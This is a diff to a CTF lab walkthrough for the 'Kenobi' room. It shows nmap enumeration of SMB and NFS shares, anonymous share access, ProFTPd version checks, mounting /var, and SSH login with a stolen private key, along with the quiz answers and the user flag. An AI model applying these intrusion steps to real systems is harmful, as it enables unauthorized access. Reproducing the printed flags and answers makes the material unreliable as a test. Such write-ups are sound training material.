@@ -1,11 +1,11 @@
 # Kenobi
 Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation. 
-#Kenobi
 
-> F3d3r!c0 | Nov 20th, 2020
 
+# F3d3r!c0 | Nov 20th, 2020
 _________________________________________________________
->[Task 1] Deploy the vulnerable machine  
+
+# [Task 1] Deploy the vulnerable machine  
 
 This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.
 
@@ -16,13 +16,13 @@ Make sure you're connected to our network and deploy the machine
 Scan the machine with nmap, how many ports are open?
 **answer: 7**
 
-[Task 2] Enumerating Samba for shares
+# [Task 2] Enumerating Samba for shares
 
 Using the nmap command above, how many shares have been found?
 
-    $ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.60.211
+    $ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse [DEPLOY_MACHINE_IP]
     Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-20 10:42 CET
-    Nmap scan report for 10.10.60.211
+    Nmap scan report for [DEPLOY_MACHINE_IP]
     Host is up (0.054s latency).
     
     PORT    STATE SERVICE
@@ -31,7 +31,7 @@ Using the nmap command above, how many shares have been found?
     Host script results:
     | smb-enum-shares:
     |   account_used: guest
-    |   \\10.10.60.211\IPC$:
+    |   \\[DEPLOY_MACHINE_IP]\IPC$:
     |     Type: STYPE_IPC_HIDDEN
     |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
     |     Users: 2
@@ -39,7 +39,7 @@ Using the nmap command above, how many shares have been found?
     |     Path: C:\tmp
     |     Anonymous access: READ/WRITE
     |     Current user access: READ/WRITE
-    |   \\10.10.60.211\anonymous:
+    |   \\[DEPLOY_MACHINE_IP]\anonymous:
     |     Type: STYPE_DISKTREE
     |     Comment:
     |     Users: 0
@@ -47,7 +47,7 @@ Using the nmap command above, how many shares have been found?
     |     Path: C:\home\kenobi\share
     |     Anonymous access: READ/WRITE
     |     Current user access: READ/WRITE
-    |   \\10.10.60.211\print$:
+    |   \\[DEPLOY_MACHINE_IP]\print$:
     |     Type: STYPE_DISKTREE
     |     Comment: Printer Drivers
     |     Users: 0
@@ -64,7 +64,7 @@ Using the nmap command above, how many shares have been found?
 
 On most distributions of Linux smbclient is already installed. Lets inspect one of the shares.
 
-    smbclient //[ip]/anonymous
+    smbclient //[DEPLOY_MACHINE_IP]/anonymous
 
 Using your machine, connect to the machines network share.
 
@@ -76,7 +76,7 @@ Once you're connected, list the files on the share. What is the file can you see
 
 You can recursively download the SMB share too. Submit the username and password as nothing.
 
-    smbget -R smb://[ip]/anonymous
+    smbget -R smb://[DEPLOY_MACHINE_IP]/anonymous
 
 Open the file on the share. There is a few interesting things found.
 
@@ -92,13 +92,13 @@ Your earlier nmap port scan will have shown port 111 running the service rpcbind
 
 In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.
 
-    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.60.211
+    nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount [DEPLOY_MACHINE_IP]
 
 What mount can we see?
 
 **answer: /var**
 
-[Task 3] Gain initial access with ProFtpd
+# [Task 3] Gain initial access with ProFtpd
 
 
 
@@ -106,11 +106,9 @@ Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP
 
 What is the version?
 
-    $ nc 10.10.60.211 21
+    $ nc [DEPLOY_MACHINE_IP] 21
 
 **answer: 1.3.5**
-
-
 
 We can use searchsploit to find exploits for a particular software version.
 
@@ -119,7 +117,6 @@ Searchsploit is basically just a command line search tool for exploit-db.com.
 How many exploits are there for the ProFTPd running?
 
 **answer: 3**
-
 
 You should have found an exploit from ProFtpd's mod_copy module.
 
@@ -149,7 +146,7 @@ What is Kenobi's user flag (/home/kenobi/user.txt)?
     $ sudo mkdir /mnt/kenobiNFS                                                                                 1 ⨯
     [sudo] password for kali:
     
-    $ sudo mount 10.10.60.211:/var /mnt/kenobiNFS
+    $ sudo mount [DEPLOY_MACHINE_IP]:/var /mnt/kenobiNFS
     
     $ ls -la /mnt/kenobiNFS
     total 56
@@ -174,12 +171,12 @@ What is Kenobi's user flag (/home/kenobi/user.txt)?
     
     $ sudo chmod 600 id_rsa                               
         
-    $ ssh -i id_rsa kenobi@10.10.60.211
+    $ ssh -i id_rsa kenobi@[DEPLOY_MACHINE_IP]
     load pubkey "id_rsa": invalid format
-    The authenticity of host '10.10.60.211 (10.10.60.211)' can't be established.
-    ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+    The authenticity of host '[DEPLOY_MACHINE_IP] ([DEPLOY_MACHINE_IP])' can't be established.
+    ECDSA key fingerprint is SHA256:.
     Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-    Warning: Permanently added '10.10.60.211' (ECDSA) to the list of known hosts.
+    Warning: Permanently added '[DEPLOY_MACHINE_IP]' (ECDSA) to the list of known hosts.
     Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
     
     * Documentation:  https://help.ubuntu.com
@@ -190,7 +187,7 @@ What is Kenobi's user flag (/home/kenobi/user.txt)?
     65 updates are security updates.
     
     
-    Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+    Last login: Wed Sep  4 07:10:15 2019 from 
     To run a command as administrator (user "root"), use "sudo <command>".
     See "man sudo_root" for details.
     
@@ -198,7 +195,7 @@ What is Kenobi's user flag (/home/kenobi/user.txt)?
 
 **answer: d0b0f3f53b6caa532a83915e19224899**
 
-[Task 4] Privilege Escalation with Path Variable Manipulation
+# [Task 4] Privilege Escalation with Path Variable Manipulation
 
 
 
